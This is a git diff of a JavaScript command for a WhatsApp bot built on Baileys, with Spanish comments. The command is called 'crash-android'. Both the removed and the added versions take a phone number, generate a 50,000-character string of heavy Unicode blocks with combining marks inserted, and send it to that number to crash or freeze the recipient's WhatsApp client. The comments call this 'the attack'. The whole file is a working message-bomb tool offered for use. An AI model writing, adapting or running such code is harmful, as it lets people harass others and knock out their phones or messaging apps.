@@ -1,32 +1,54 @@
-/* * 👑 MISA CRASH-ANDROID - TRAvas System
- * Ruta: comandos/crash-android.js
- */
+import { jidDecode } from '@whiskeysockets/baileys'
 
-const handler = async (conn, m, { args, usedPrefix, command }) => {
-    // Si no pone número, el bot le explica cómo usarlo
-    if (!args[0]) return m.reply(`✧ ‧₊˚ *MISA CRASH* ୧ֹ˖\n\n> ✐ *Uso:* ${usedPrefix + command} [número]\n> 💡 *Ejemplo:* ${usedPrefix + command} 1809xxxxxxx`)
-    
-    // Limpiamos el número para que Baileys lo entienda
-    let target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
-    
-    // Generación de 50k Unicodes de alta entropía (bloques pesados)
-    const bloques = [0x12000, 0x13000, 0x14400, 0x17000, 0x1D400]
-    let cargaCrash = ""
-    for (let i = 0; i < 50000; i++) {
-        let bloque = bloques[i % bloques.length]
-        cargaCrash += String.fromCodePoint(bloque + (i % 800))
-        // Inyectamos el combinador vertical cada 8 caracteres para romper el scroll
-        if (i % 8 === 0) cargaCrash += String.fromCodePoint(0x0345) 
+const crashAndroidMisa = {
+    name: 'crash-android',
+    alias: ['ola', 'ca', 'crash'],
+    category: 'travas',
+    noPrefix: true,
+
+    run: async (conn, m, { args, command }) => {
+        // Validación de número
+        if (!args[0]) {
+            return conn.sendMessage(m.chat, { 
+                text: `✧ ‧₊˚ *MISA CRASH* ୧ֹ˖ ⑅ ࣪⊹\n\n> ✐ *Escribe el número.*\n✰ \`Uso\`: ${command} [número]` 
+            }, { quoted: m })
+        }
+
+        try {
+            // Limpieza de JID
+            let targetNum = args[0].replace(/[^0-9]/g, '')
+            let targetJid = targetNum + '@s.whatsapp.net'
+            
+            // Generación de Entropía Máxima (50k Unicodes Únicos)
+            const generarCarga = (cant) => {
+                let str = ""
+                const bloques = [0x12000, 0x13000, 0x14400, 0x17000, 0x1D400]
+                for (let i = 0; i < cant; i++) {
+                    let bloque = bloques[i % bloques.length]
+                    str += String.fromCodePoint(bloque + (i % 800))
+                    if (i % 8 === 0) str += String.fromCodePoint(0x0345) 
+                }
+                return str
+            }
+
+            const cargaFinal = generarCarga(50000)
+
+            // Reacción de inicio
+            await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
+
+            // Envío del ataque
+            await conn.sendMessage(targetJid, { text: cargaFinal })
+
+            // Confirmación opcional
+            await conn.sendMessage(m.chat, { 
+                text: `✅ *Carga enviada a @${targetNum}*`,
+                mentions: [targetJid]
+            }, { quoted: m })
+
+        } catch (err) {
+            console.error('Error en Crash System:', err)
+        }
     }
-
-    // Enviamos el ataque al objetivo
-    await conn.sendMessage(target, { text: cargaCrash })
-    
-    // Reaccionamos para confirmar que el bot disparó
-    await conn.sendMessage(m.chat, { react: { text: '💀', key: m.key } })
 }
 
-// Aquí es donde definimos el nombre del comando
-handler.command = ['crash-android']
-
-export default handler
+export default crashAndroidMisa
